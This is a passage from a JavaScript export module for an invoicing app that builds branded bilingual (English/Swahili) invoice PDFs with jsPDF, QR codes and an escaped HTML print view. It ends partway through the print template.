/**
 * Export engine
 * Professional PDF generation (jsPDF + AutoTable), CSV export, QR codes, printing.
 */
import { escapeHTML, downloadBlob, downloadDataURI } from './utils.js';
import { formatMoney, amountToWords, amountToWordsSwahili } from './currency.js';
import { round2 } from './calculations.js';
import { loadBrandSync, pdfColors, paletteToCss } from './brand.js';
import { fallbackBusinessName } from './config.js';

/* ---------------- QR Code ---------------- */

/**
 * Generate a QR code data URL using the vendored qrcodejs library.
 * @param {string} text - content to encode
 * @param {number} size - pixel size
 */
export function generateQRDataURL(text, size = 220) {
  return new Promise((resolve, reject) => {
    if (typeof QRCode === 'undefined') {
      reject(new Error('QRCode library not loaded'));
      return;
    }
    const container = document.createElement('div');
    container.style.position = 'absolute';
    container.style.left = '-9999px';
    document.body.appendChild(container);
    try {
      // QR modules follow the brand so the code looks native to the invoice.
      const { vars } = pdfColors(loadBrandSync(), 'light');
      const qr = new QRCode(container, {
        text: String(text || ''),
        width: size,
        height: size,
        colorDark: vars['--brand-darker'],
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.M,
      });
      const canvas = container.querySelector('canvas');
      if (canvas) {
        resolve(canvas.toDataURL('image/png'));
      } else {
        const img = container.querySelector('img');
        if (img) resolve(img.src);
        else reject(new Error('QR code generation failed'));
      }
    } catch (err) {
      reject(err);
    } finally {
      setTimeout(() => container.remove(), 50);
    }
  });
}

/** Build the QR payload for an invoice. */
export function buildQRPayload(invoice, company) {
  const lines = [
    `INV:${invoice.number || ''}`,
    `BIZ:${company.businessName || ''}`,
    `AMT:${round2(invoice.grandTotal || 0)}`,
    `CUR:${invoice.currency || 'TZS'}`,
    `REF:${invoice.paymentReference || ''}`,
  ];
  if (company.website) lines.push(`WEB:${company.website}`);
  if (company.whatsapp) lines.push(`WA:${company.whatsapp}`);
  return lines.join('\n');
}

/* ---------------- PDF ----------------
   The palette is resolved per call from the active brand. Invoices always render
   on white paper, so they use the LIGHT palette regardless of the app's theme. */

let BRAND = [27, 94, 32];           // #1B5E20
let BRAND_DARK = [7, 23, 8];        // #071708
let GOLD = [255, 193, 7];           // #FFC107
let BRAND_INK = [27, 94, 32];       // brand as text on white
let ACCENT_INK = [173, 130, 0];     // accent as text on white
let BRAND_CONTRAST = [255, 255, 255]; // text on a brand fill
const INK = [15, 31, 20];          // #0F1F14
const INK_SOFT = [76, 95, 82];     // #4C5F52
const INK_FAINT = [124, 143, 130]; // #7C8F82
const BORDER = [213, 226, 214];    // #D5E2D6
const SURFACE_2 = [237, 243, 238]; // #EDF3EE

/** Pull the current brand into the module-level palette. Returns the raw CSS vars. */
function syncPdfPalette() {
  const p = pdfColors(loadBrandSync(), 'light');
  BRAND = p.brand;
  BRAND_DARK = p.brandDark;
  GOLD = p.accent;
  BRAND_INK = p.brandInk;
  ACCENT_INK = p.accentInk;
  BRAND_CONTRAST = p.brandContrast;
  return p.vars;
}

function loadImage(dataUrl) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(img);
    img.onerror = () => reject(new Error('Image load failed'));
    img.src = dataUrl;
  });
}

/**
 * The format label jsPDF needs for `addImage`.
 *
 * Settings normalises every newly uploaded logo to PNG, but a logo stored
 * before that existed can still be a JPEG, WebP or SVG. Telling jsPDF the wrong
 * type makes it drop the image without raising — the PDF then silently ships
 * without a logo — so the type is read back off the data URL itself.
 */
function imageTypeFromDataUrl(dataUrl) {
  const match = /^data:image\/([a-z0-9.+-]+)/i.exec(String(dataUrl || ''));
  switch ((match ? match[1] : 'png').toLowerCase()) {
    case 'jpg':
    case 'jpeg':
    case 'pjpeg':
      return 'JPEG';
    case 'webp':
      return 'WEBP';
    case 'gif':
      return 'GIF';
    case 'bmp':
      return 'BMP';
    case 'svg+xml':
    case 'svg':
      return 'SVG';
    default:
      return 'PNG';
  }
}

/**
 * jsPDF has no SVG renderer, so an SVG logo is rasterised through a canvas
 * before it is embedded. Without this it vanishes from the PDF while still
 * showing in the preview — the most confusing possible failure.
 */
async function rasteriseSvg(dataUrl, maxPx = 512) {
  const img = await loadImage(dataUrl);
  const srcW = img.naturalWidth || img.width || 300;
  const srcH = img.naturalHeight || img.height || 150;
  const scale = Math.min(1, maxPx / Math.max(srcW, srcH));
  const canvas = document.createElement('canvas');
  canvas.width = Math.max(1, Math.round(srcW * scale));
  canvas.height = Math.max(1, Math.round(srcH * scale));
  const ctx = canvas.getContext('2d');
  if (!ctx) throw new Error('canvas 2d context unavailable');
  ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

/**
 * Generate a professional A4 invoice PDF.
 * @param {Object} invoice - invoice record
 * @param {Object} company - company settings
 * @param {Object} currency - currency definition
 * @param {Object} opts - { logoDataUrl, qrDataUrl, language }
 */
export async function generateInvoicePDF(invoice, company, currency, opts = {}) {
  syncPdfPalette();
  const { jsPDF } = window.jspdf;
  const doc = new jsPDF({ unit: 'mm', format: 'a4', orientation: 'portrait', compress: true });
  const pageW = doc.internal.pageSize.getWidth();   // 210
  const pageH = doc.internal.pageSize.getHeight();  // 297
  const margin = 14;
  const contentW = pageW - margin * 2;
  const lang = opts.language || 'en';

  const t = (en, sw) => (lang === 'sw' ? sw : en);

  let y = margin;

  /* ---- Header band ---- */
  doc.setFillColor(...BRAND_DARK);
  doc.rect(0, 0, pageW, 6, 'F');
  doc.setFillColor(...GOLD);
  doc.rect(0, 6, pageW, 1.2, 'F');

  /* ---- Company block: name, then logo beneath it, then the details ----
     The letterhead stacks the mark UNDER the business name rather than beside
     it, so the three parts form one left-aligned column and the column's real
     bottom — not a guessed offset — decides where the invoice body starts. */
  y = margin + 6;
  const logoSize = 22;

  doc.setFont('helvetica', 'bold');
  doc.setFontSize(15);
  doc.setTextColor(...BRAND_INK);
  doc.text(String(company.businessName || 'Business Name'), margin, y + 6);

  let brandY = y + 12;
  if (opts.logoDataUrl) {
    try {
      let logoData = opts.logoDataUrl;
      let logoType = imageTypeFromDataUrl(logoData);
      if (logoType === 'SVG') {
        logoData = await rasteriseSvg(logoData);
        logoType = 'PNG';
      }
      const img = await loadImage(logoData);
      const ratio = img.width / img.height;
      let w = logoSize;
      let h = logoSize;
      if (ratio > 1) { h = logoSize / ratio; } else { w = logoSize * ratio; }
      doc.addImage(logoData, logoType, margin, brandY, w, h);
      brandY += h + 4;
    } catch (err) {
      // Ship the invoice without a logo rather than failing the export, but
      // say so — a logo that silently vanishes is hard to diagnose.
      console.warn('[export] logo could not be embedded in the PDF', err);
    }
  }

  doc.setFont('helvetica', 'normal');
  doc.setFontSize(8.5);
  doc.setTextColor(...INK_SOFT);
  const companyLines = [];
  if (company.address) companyLines.push(company.address);
  const regionLine = [company.region, company.district, company.country].filter(Boolean).join(', ');
  if (regionLine) companyLines.push(regionLine);
  if (company.phone) companyLines.push(`Tel: ${company.phone}`);
  if (company.email) companyLines.push(`Email: ${company.email}`);
  if (company.tin) companyLines.push(`TIN: ${company.tin}`);
  if (company.vrn) companyLines.push(`VRN: ${company.vrn}`);
  if (company.regNumber) companyLines.push(`Reg: ${company.regNumber}`);
  const companyLinesShown = companyLines.slice(0, 7);
  companyLinesShown.forEach((line, i) => {
    doc.text(String(line), margin, brandY + i * 3.9);
  });
  const brandBottom = brandY + companyLinesShown.length * 3.9;

  /* ---- Invoice title + meta (right side) ---- */
  const rightX = pageW - margin;
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(22);
  doc.setTextColor(...BRAND_INK);
  doc.text(t('INVOICE', 'ANKARA'), rightX, y + 8, { align: 'right' });

  doc.setFontSize(9);
  doc.setTextColor(...INK);
  const meta = [
    [t('Invoice No', 'Namba ya Ankara'), invoice.number || ''],
    [t('Issue Date', 'Tarehe'), invoice.issueDate || ''],
    [t('Due Date', 'Tarehe ya Kukamilika'), invoice.dueDate || ''],
    [t('Payment Terms', 'Masharti ya Malipo'), invoice.paymentTerms || ''],
    [t('Status', 'Hali'), t(statusLabel(invoice.status), statusLabelSw(invoice.status))],
  ];
  /* One row per entry — label left, value right — which is exactly how the
     preview renders `.doc-meta` (a two-column grid). Drawing the label above
     the value instead made this block 42 mm tall on its own and was the single
     biggest reason the signature band could not fit on page 1. */
  const metaLabelX = pageW - margin - 78;
  let metaY = y + 15;
  meta.forEach(([k, v]) => {
    doc.setFont('helvetica', 'bold');
    doc.setTextColor(...INK_FAINT);
    doc.text(String(k), metaLabelX, metaY);
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(...INK);
    doc.text(String(v), rightX, metaY, { align: 'right' });
    metaY += 5.6;
  });

  y = Math.max(brandBottom, metaY) + 8;

  /* ---- Bill To / Ship To ----
     Both boxes are drawn at the height the TALLER column needs. They used to
     be a fixed 26 mm while the detail list still drew its 4th line at
     y + 29.6 — so a customer with an address, phone, email and TIN had the TIN
     sitting outside the box. Text is wrapped to the column width too, so a long
     address cannot run past the right edge. */
  const colGap = 12;
  const colW = (contentW - colGap) / 2;
  const partyPadX = 6;
  const partyTextW = colW - partyPadX * 2;
  const NAME_LINE_H = 4.6;
  const DETAIL_LINE_H = 3.8;
  /* Distance from the top of the box down to the first name baseline. */
  const PARTY_TOP = 10.5;

  const billDetails = [];
  if (invoice.customerAddress) billDetails.push(invoice.customerAddress);
  if (invoice.customerPhone) billDetails.push(`Tel: ${invoice.customerPhone}`);
  if (invoice.customerEmail) billDetails.push(`Email: ${invoice.customerEmail}`);
  if (invoice.customerTin) billDetails.push(`TIN: ${invoice.customerTin}`);

  const shipDetails = [];
  if (invoice.shipToAddress) shipDetails.push(invoice.shipToAddress);
  if (invoice.shipToPhone) shipDetails.push(`Tel: ${invoice.shipToPhone}`);

  doc.setFont('helvetica', 'normal');
  doc.setFontSize(8.5);
  const wrapParty = (lines) => lines.flatMap((line) => doc.splitTextToSize(String(line), partyTextW));

  const billNameLines = doc.splitTextToSize(String(invoice.customerName || 'Customer Name'), partyTextW);
  const shipNameLines = doc.splitTextToSize(String(invoice.shipToName || invoice.customerName || '—'), partyTextW);
  const billDetailLines = wrapParty(billDetails);
  const shipDetailLines = wrapParty(shipDetails);

  // PARTY_TOP down to the name, one line of leading before the details, 3 mm
  // of bottom padding — measured from the top of the box.
  const partyHeight = (nameLines, detailLines) =>
    PARTY_TOP + nameLines.length * NAME_LINE_H
    + (detailLines.length ? 1 : 0)
    + detailLines.length * DETAIL_LINE_H
    + 3;
  const boxH = Math.max(26, partyHeight(billNameLines, billDetailLines), partyHeight(shipNameLines, shipDetailLines));

  doc.setFillColor(...SURFACE_2);
  doc.roundedRect(margin, y, contentW, boxH, 2, 2, 'F');
  doc.setDrawColor(...BORDER);
  doc.roundedRect(margin, y, contentW, boxH, 2, 2, 'S');

  const drawParty = (x, title, nameLines, detailLines) => {
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(8);
    doc.setTextColor(...BRAND_INK);
    doc.text(title, x + partyPadX, y + 6);

    doc.setFontSize(10);
    doc.setTextColor(...INK);
    let ty = y + PARTY_TOP;
    nameLines.forEach((line) => { doc.text(line, x + partyPadX, ty); ty += NAME_LINE_H; });

    if (!detailLines.length) return;
    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(...INK_SOFT);
    ty += 1;
    detailLines.forEach((line) => { doc.text(line, x + partyPadX, ty); ty += DETAIL_LINE_H; });
  };

  drawParty(margin, t('BILL TO', 'MLIPAJI'), billNameLines, billDetailLines);
  drawParty(margin + colW + colGap, t('SHIP TO', 'PALE UNAPELEKA'), shipNameLines, shipDetailLines);

  y += boxH + 8;

  /* ---- Items table (AutoTable with pagination) ---- */
  const head = [
    [t('#', '#'), t('Description', 'Maelezo'), t('Qty', 'Idadi'), t('Unit Price', 'Bei'), t('Disc %', 'Punguzo %'), t('Amount', 'Kiasi')],
  ];
  const body = (invoice.items || []).map((item, i) => [
    String(i + 1),
    `${item.name || ''}${item.description ? '\n' + item.description : ''}`,
    String(item.qty ?? 0),
    formatMoney(item.unitPrice ?? 0, currency),
    item.discountRate ? `${item.discountRate}%` : '—',
    formatMoney(item.total ?? 0, currency),
  ]);

  doc.autoTable({
    startY: y,
    head,
    body,
    margin: { left: margin, right: margin, top: 20, bottom: 30 },
    theme: 'grid',
    styles: {
      font: 'helvetica',
      fontSize: 8.5,
      textColor: INK,
      lineColor: BORDER,
      lineWidth: 0.2,
      cellPadding: 2,
      valign: 'middle',
    },
    headStyles: {
      fillColor: BRAND,
      textColor: [255, 255, 255],
      fontStyle: 'bold',
      fontSize: 8,
      halign: 'left',
    },
    columnStyles: {
      0: { cellWidth: 10, halign: 'center' },
      1: { cellWidth: 'auto' },
      2: { cellWidth: 16, halign: 'center' },
      3: { cellWidth: 30, halign: 'right' },
      4: { cellWidth: 18, halign: 'center' },
      5: { cellWidth: 32, halign: 'right' },
    },
    alternateRowStyles: { fillColor: [248, 250, 248] },
    didParseCell: (data) => {
      if (data.section === 'body' && data.column.index === 1) {
        data.cell.styles.valign = 'middle';
      }
    },
  });

  y = doc.lastAutoTable.finalY + 8;

  /* ---- Summary: totals on the right, everything else on the left ----
     This mirrors the preview, which lays the same material out as a `.flex-1`
     column (amount in words, then notes) beside a right-hand `.totals` block.
     The PDF used to STACK these instead — totals, then words, then the balance
     line, then notes, then the payment details — which for a five-line invoice
     cost ~99 mm where the side-by-side form costs ~57 mm. That 42 mm was the
     whole reason the signature band was being pushed onto a second page: the
     preview showed one page and the PDF delivered two. */
  const totalsW = 78;
  const totalsX = pageW - margin - totalsW;
  const summaryGap = 10;
  const leftW = contentW - totalsW - summaryGap;
  const summaryTop = y;

  /* ---------- Left column ---------- */
  let leftY = summaryTop;

  doc.setFont('helvetica', 'italic');
  doc.setFontSize(8.5);
  doc.setTextColor(...INK_SOFT);
  const words = lang === 'sw'
    ? amountToWordsSwahili(invoice.grandTotal ?? 0, currency)
    : amountToWords(invoice.grandTotal ?? 0, currency);
  const wordsLabel = t('Amount in Words:', 'Kiasi kwa Maneno:');
  const splitWords = doc.splitTextToSize(`${wordsLabel} ${words}`, leftW);
  doc.text(splitWords, margin, leftY);
  leftY += splitWords.length * 4.2 + 5;

  if (invoice.notes) {
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(8);
    doc.setTextColor(...BRAND_INK);
    doc.text(t('NOTES', 'MAELEZO'), margin, leftY);
    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(...INK_SOFT);
    const notes = doc.splitTextToSize(String(invoice.notes), leftW);
    doc.text(notes, margin, leftY + 5);
    leftY += notes.length * 4.2 + 7;
  }

  const payDetails = [];
  if (company.bankName) payDetails.push(`${t('Bank', 'Benki')}: ${company.bankName}`);
  if (company.bankAccountName) payDetails.push(`${t('Account Name', 'Jina la Akaunti')}: ${company.bankAccountName}`);
  if (company.bankAccountNumber) payDetails.push(`${t('Account No', 'Namba ya Akaunti')}: ${company.bankAccountNumber}`);
  if (company.mobileMoney) payDetails.push(`${t('Mobile Money', 'Fedha za Simu')}: ${company.mobileMoney}`);
  const payLines = payDetails.slice(0, 4).flatMap((line) => doc.splitTextToSize(String(line), leftW));
  if (payLines.length) {
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(8);
    doc.setTextColor(...BRAND_INK);
    doc.text(t('PAYMENT DETAILS', 'Maelezo ya MALIPO'), margin, leftY);
    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(...INK_SOFT);
    payLines.forEach((line, i) => { doc.text(String(line), margin, leftY + 5 + i * 3.9); });
    leftY += payLines.length * 3.9 + 6;
  }

  /* ---------- Right column: totals ---------- */
  let totalsY = summaryTop;
  const totals = [
    [t('Subtotal', 'Jumla Ndogo'), invoice.subtotal ?? 0],
    [t('Item Discount', 'Punguzo la Bidhaa'), -(invoice.itemDiscount ?? 0)],
    [t('Invoice Discount', 'Punguzo la Ankara'), -(invoice.invoiceDiscount ?? 0)],
    [t('Tax', 'Kodi'), invoice.tax ?? 0],
    [t('Shipping', 'Usafirishaji'), invoice.shipping ?? 0],
  ];

  doc.setFontSize(8.5);
  totals.forEach(([label, amount]) => {
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(...INK_SOFT);
    doc.text(String(label), totalsX, totalsY);
    doc.setFont('helvetica', 'bold');
    doc.setTextColor(...INK);
    doc.text(formatMoney(amount, currency), totalsX + totalsW, totalsY, { align: 'right' });
    totalsY += 6;
  });

  // Grand total band
  doc.setFillColor(...BRAND);
  doc.roundedRect(totalsX - 4, totalsY - 1, totalsW + 8, 9, 2, 2, 'F');
  doc.setFont('helvetica', 'bold');
  doc.setFontSize(10);
  doc.setTextColor(...BRAND_CONTRAST);
  doc.text(t('GRAND TOTAL', 'JUMLA KUU'), totalsX, totalsY + 5.5);
  doc.text(formatMoney(invoice.grandTotal ?? 0, currency), totalsX + totalsW, totalsY + 5.5, { align: 'right' });
  totalsY += 11;

  // Amount paid and balance sit inside the totals block, as they do in the
  // preview — they are part of the same money summary, not a separate line.
  doc.setFontSize(8.5);
  [[t('Amount Paid', 'Kiasi Kilicholipwa'), invoice.amountPaid ?? 0, INK],
   [t('Balance Due', 'Salio'), invoice.balance ?? 0, BRAND_INK]].forEach(([label, amount, colour]) => {
    doc.setFont('helvetica', 'normal');
    doc.setTextColor(...INK_SOFT);
    doc.text(String(label), totalsX, totalsY);
    doc.setFont('helvetica', 'bold');
    doc.setTextColor(...colour);
    doc.text(formatMoney(amount, currency), totalsX + totalsW, totalsY, { align: 'right' });
    totalsY += 6;
  });

  // The taller column decides where the signature band starts.
  y = Math.max(leftY, totalsY) + 8;

  /* ---- QR + authorisation (signature & stamp) ----
     The signature and the stamp are images uploaded in Settings → Business
     Information. When one has not been supplied the block falls back to a
     ruled line / a placeholder ring, so an invoice always leaves a place to
     sign. Everything is laid out in millimetres from `authTop`, which is the
     top of the whole band. */
  const qrSize = 28;
  /* The band's lowest ink is the QR caption at authTop + 32, so 34 mm is the
     real height. The old test reserved pageH - 22 (a 22 mm bottom margin) when
     the footer rule actually sits at pageH - 14 — 8 mm of slack thrown away,
     which alone was enough to push a one-line invoice onto a second page. */
  const AUTH_H = 34;
  let authTop = y;
  // Keep the whole band on one page instead of letting it run into the footer.
  if (authTop + AUTH_H > pageH - 18) {
    doc.addPage();
    authTop = margin;
  }

  const qrX = pageW - margin - qrSize;
  if (opts.qrDataUrl) {
    try {
      doc.addImage(opts.qrDataUrl, 'PNG', qrX, authTop, qrSize, qrSize);
      doc.setFont('helvetica', 'normal');
      doc.setFontSize(6.5);
      doc.setTextColor(...INK_FAINT);
      doc.text(t('Scan to verify', 'Changanua kuthibitisha'), qrX + qrSize / 2, authTop + qrSize + 4, { align: 'center' });
    } catch {
      // skip QR if it fails
    }
  }

  /* Signature: the uploaded mark sits directly above the rule it signs. */
  const sigW = 62;
  const sigRuleY = authTop + 25;
  if (opts.signatureDataUrl) {
    try {
      let sigData = opts.signatureDataUrl;
      let sigType = imageTypeFromDataUrl(sigData);
      if (sigType === 'SVG') { sigData = await rasteriseSvg(sigData); sigType = 'PNG'; }
      const img = await loadImage(sigData);
      const ratio = img.width / img.height;
      let w = sigW - 6;
      let h = w / ratio;
      if (h > 22) { h = 22; w = h * ratio; }
      doc.addImage(sigData, sigType, margin + 3, sigRuleY - h - 1.5, w, h);
    } catch (err) {
      console.warn('[export] signature could not be embedded in the PDF', err);
    }
  }
  doc.setDrawColor(...INK_FAINT);
  doc.setLineWidth(0.3);
  doc.line(margin, sigRuleY, margin + sigW, sigRuleY);
  doc.setFont('helvetica', 'normal');
  doc.setFontSize(8);
  doc.setTextColor(...INK_SOFT);
  doc.text(t('Authorized Signature', 'Sahihi Iliyoidhinishwa'), margin, sigRuleY + 5);

  /* Company stamp. */
  const stampR = 12;
  const stampCx = margin + sigW + 36;
  const stampCy = authTop + 13;
  if (opts.stampDataUrl) {
    try {
      let stampData = opts.stampDataUrl;
      let stampType = imageTypeFromDataUrl(stampData);
      if (stampType === 'SVG') { stampData = await rasteriseSvg(stampData); stampType = 'PNG'; }
      const img = await loadImage(stampData);
      const ratio = img.width / img.height;
      let w = stampR * 2;
      let h = stampR * 2;
      if (ratio > 1) { h = w / ratio; } else { w = h * ratio; }
      doc.addImage(stampData, stampType, stampCx - w / 2, stampCy - h / 2, w, h);
      doc.setFont('helvetica', 'normal');
      doc.setFontSize(7);
      doc.setTextColor(...INK_FAINT);
      doc.text(t('Company Stamp', 'Muhuri wa Kampuni'), stampCx, authTop + 29, { align: 'center' });
    } catch (err) {
      console.warn('[export] stamp could not be embedded in the PDF', err);
    }
  } else {
    doc.setDrawColor(...GOLD);
    doc.setLineWidth(0.6);
    doc.circle(stampCx, stampCy, stampR, 'S');
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(6.5);
    doc.setTextColor(...ACCENT_INK);
    doc.text(t('COMPANY STAMP', 'MUHURI WA KAMPUNI'), stampCx, stampCy + 2, { align: 'center' });
  }

  /* ---- Footer on every page ---- */
  const pageCount = doc.internal.getNumberOfPages();
  for (let i = 1; i <= pageCount; i++) {
    doc.setPage(i);
    const h = doc.internal.pageSize.getHeight();
    doc.setDrawColor(...BORDER);
    doc.setLineWidth(0.3);
    doc.line(margin, h - 14, pageW - margin, h - 14);
    doc.setFont('helvetica', 'normal');
    doc.setFontSize(7.5);
    doc.setTextColor(...INK_FAINT);
    const footerLeft = company.businessName || fallbackBusinessName();
    const footerRight = `${t('Page', 'Ukurasa')} ${i} / ${pageCount}`;
    doc.text(String(footerLeft), margin, h - 9);
    doc.text(footerRight, pageW - margin, h - 9, { align: 'right' });
    if (company.website) {
      doc.text(String(company.website), pageW / 2, h - 9, { align: 'center' });
    }
  }

  return doc;
}

function statusLabel(status) {
  const map = { draft: 'Draft', unpaid: 'Unpaid', partial: 'Partially Paid', paid: 'Paid', overdue: 'Overdue', cancelled: 'Cancelled' };
  return map[status] || status || '—';
}
function statusLabelSw(status) {
  const map = { draft: 'Rasimu', unpaid: 'Haijalipwa', partial: 'Imelipwa Kiasi', paid: 'Imelipwa', overdue: 'Imechelewa', cancelled: 'Imefutwa' };
  return map[status] || status || '—';
}

/** Download an invoice PDF. */
export async function downloadInvoicePDF(invoice, company, currency, opts = {}) {
  const doc = await generateInvoicePDF(invoice, company, currency, opts);
  const safeName = String(invoice.number || 'invoice').replace(/[^\w.-]+/g, '_');
  doc.save(`${safeName}.pdf`);
}

/** Open the print dialog for an invoice. */
export function printInvoice(invoice, company, currency, opts = {}) {
  const lang = opts.language || 'en';
  const t = (en, sw) => (lang === 'sw' ? sw : en);
  const win = window.open('', '_blank', 'width=900,height=700');
  if (!win) {
    // Fallback: print current page
    window.print();
    return;
  }
  const rows = (invoice.items || []).map((item, i) => `
    <tr>
      <td>${i + 1}</td>
      <td><strong>${escapeHTML(item.name || '')}</strong>${item.description ? `<br><span class="sub">${escapeHTML(item.description)}</span>` : ''}</td>
      <td class="num">${escapeHTML(String(item.qty ?? 0))}</td>
      <td class="num">${escapeHTML(formatMoney(item.unitPrice ?? 0, currency))}</td>
      <td class="num">${item.discountRate ? escapeHTML(String(item.discountRate)) + '%' : '—'}</td>
      <td class="num">${escapeHTML(formatMoney(item.total ?? 0, currency))}</td>
    </tr>`).join('');

  const totalRows = `
    <tr><td colspan="5">${t('Subtotal', 'Jumla Ndogo')}</td><td class="num">${escapeHTML(formatMoney(invoice.subtotal ?? 0, currency))}</td></tr>
    ${(invoice.itemDiscount ?? 0) ? `<tr><td colspan="5">${t('Item Discount', 'Punguzo la Bidhaa')}</td><td class="num">-${escapeHTML(formatMoney(invoice.itemDiscount, currency))}</td></tr>` : ''}
    ${(invoice.invoiceDiscount ?? 0) ? `<tr><td colspan="5">${t('Invoice Discount', 'Punguzo la Ankara')}</td><td class="num">-${escapeHTML(formatMoney(invoice.invoiceDiscount, currency))}</td></tr>` : ''}
    ${(invoice.tax ?? 0) ? `<tr><td colspan="5">${t('Tax', 'Kodi')}</td><td class="num">${escapeHTML(formatMoney(invoice.tax, currency))}</td></tr>` : ''}
    ${(invoice.shipping ?? 0) ? `<tr><td colspan="5">${t('Shipping', 'Usafirishaji')}</td><td class="num">${escapeHTML(formatMoney(invoice.shipping, currency))}</td></tr>` : ''}
    <tr class="grand"><td colspan="5">${t('GRAND TOTAL', 'JUMLA KUU')}</td><td class="num">${escapeHTML(formatMoney(invoice.grandTotal ?? 0, currency))}</td></tr>
    <tr><td colspan="5">${t('Amount Paid', 'Kiasi Kilicholipwa')}</td><td class="num">${escapeHTML(formatMoney(invoice.amountPaid ?? 0, currency))}</td></tr>
    <tr class="balance"><td colspan="5">${t('Balance Due', 'Salio')}</td><td class="num">${escapeHTML(formatMoney(invoice.balance ?? 0, currency))}</td></tr>`;

  const words = lang === 'sw'
    ? amountToWordsSwahili(invoice.grandTotal ?? 0, currency)
    : amountToWords(invoice.grandTotal ?? 0, currency);

  win.document.write(`<!DOCTYPE html>
<html lang="${lang}">
<head>
<meta charset="utf-8">
<title>${escapeHTML(invoice.number || 'Invoice')}</title>
<style>
${paletteToCss(loadBrandSync(), 'light')}
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: "Segoe UI", Arial, sans-serif; color: #2B2B2B; font-size: 13px; padding: 30px; }
  .header { display: flex; justify-content: space-between; gap: 20px; border-bottom: 3px solid var(--brand); padding-bottom: 18px; margin-bottom: 20px; }
  /* The mark sits under the business name, matching the PDF and the preview. */
  .company .logo { display: block; height: 56px; max-width: 170px; object-fit: contain; margin: 6px 0 8px; }
  .company h1 { color: var(--brand-ink); font-size: 20px; margin-bottom: 4px; }
  .company p { color: #5A5A5A; font-size: 11px; line-height: 1.6; }
  .title { text-align: right; }
  .title h2 { color: var(--brand-ink); font-size: 30px; letter-spacing: 2px; }
  .meta { margin-top: 8px; font-size: 11px; }
  .meta div { display: flex; justify-content: space-between; gap: 20px; padding: 2px 0; }
  .meta span:first-child { color: #8A8A8A; font-weight: 600; }
  .meta span:last-child { font-weight: 700; }
  .parties { display: flex; gap: 20px; margin-bottom: 20px; }
  .party { flex: 1; background: var(--brand-soft); border: 1px solid #E4E7E4; border-radius: 8px; padding: 14px; }
  .party h3 { color: var(--brand-ink); font-size: 10px; letter-spacing: 1px; margin-bottom: 6px; }
  .party .name { font-weight: 700; font-size: 14px; margin-bottom: 4px; }
  .party p { color: #5A5A5A; font-size: 11px; line-height: 1.6; }
  table { width: 100%; border-collapse: collapse; margin-bottom: 16px; }
  th { background: var(--brand); color: var(--brand-contrast); text-align: left; padding: 8px 10px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
  td { padding: 8px 10px; border-bottom: 1px solid #E4E7E4; vertical-align: top; }
  tr:nth-child(even) td { background: #F8FAF8; }
  .num { text-align: right; font-variant-numeric: tabular-nums; }
  .sub { color: #8A8A8A; font-size: 11px; }
  .totals { margin-left: auto; width: 300px; }
  .totals table { margin-bottom: 0; }
  .totals td { border-bottom: 1px solid #E4E7E4; padding: 5px 10px; }
  .totals .grand td { background: var(--brand) !important; color: var(--brand-contrast); font-weight: 800; font-size: 14px; }
  .totals .balance td { font-weight: 800; color: var(--brand-ink); }
  .words { font-style: italic; color: #5A5A5A; font-size: 11px; margin-bottom: 16px; }
  .notes { font-size: 11px; color: #5A5A5A; margin-bottom: 16px; }
  .notes h4 { color: var(--brand-ink); font-size: 10px; letter-spacing: 1px; margin-bottom: 4px; }
  .footer { border-top: 1px solid #E4E7E4; margin-top: 24px; padding-top: 10px; text-align: center; color: #8A8A8A; font-size: 10px; }
  .sign { display: flex; gap: 60px; align-items: flex-end; margin-top: 44px; }
  .sign-cell { min-width: 210px; }
  .sign-cell img { display: block; height: 54px; max-width: 210px; object-fit: contain; margin: 0 0 2px 4px; }
  .sign-rule { border-top: 1px solid #8A8A8A; }
  .sign-label { font-size: 10px; color: #8A8A8A; margin-top: 5px; }
  .stamp-ring {
    width: 84px; height: 84px; border: 2px solid var(--gold); border-radius: 50%;
    display: grid; place-items: center; text-align: center; padding: 8px;
    font-size: 8px; font-weight: 800; letter-spacing: 0.06em; color: var(--gold-ink);
  }
  .sign-cell img.stamp { height: 84px; max-width: 130px; margin: 0; }
  @media print { body { padding: 0; } }
</style>
</head>
<body>
  <div class="header">
    <div class="company">
      <h1>${escapeHTML(company.businessName || 'Business Name')}</h1>
      ${opts.logoDataUrl ? `<img class="logo" src="${escapeHTML(opts.logoDataUrl)}" alt="">` : ''}
      ${company.address ? `<p>${escapeHTML(company.address)}</p>` : ''}
      ${[company.region, company.district, company.country].filter(Boolean).length ? `<p>${escapeHTML([company.region, company.district, company.country].filter(Boolean).join(', '))}</p>` : ''}
      ${company.phone ? `<p>Tel: ${escapeHTML(company.phone)}</p>` : ''}
      ${company.email ? `<p>Email: ${escapeHTML(company.email)}</p>` : ''}
      ${company.tin ? `<p>TIN: ${escapeHTML(company.tin)}</p>` : ''}
      ${company.vrn ? `<p>VRN: ${escapeHTML(company.vrn)}</p>` : ''}
    </div>
    <div class="title">
      <h2>${t('INVOICE', 'ANKARA')}</h2>
      <div class="meta">
        <div><span>${t('Invoice No', 'Namba')}</span><span>${escapeHTML(invoice.number || '')}</span></div>
        <div><span>${t('Issue Date', 'Tarehe')}</span><span>${escapeHTML(invoice.issueDate || '')}</span></div>
        <div><span>${t('Due Date', 'Tarehe ya Kukamilika')}</span><span>${escapeHTML(invoice.dueDate || '')}</span></div>
        <div><span>${t('Status', 'Hali')}</span><span>${escapeHTML(statusLabel(invoice.status))}</span></div>
      </div>
    </div>
  </div>
  <div class="parties">
    <div class="party">
      <h3>${t('BILL TO', 'MLIPAJI')}</h3>
      <div class="name">${escapeHTML(invoice.customerName || 'Customer Name')}</div>
      ${invoice.customerAddress ? `<p>${escapeHTML(invoice.customerAddress)}</p>` : ''}
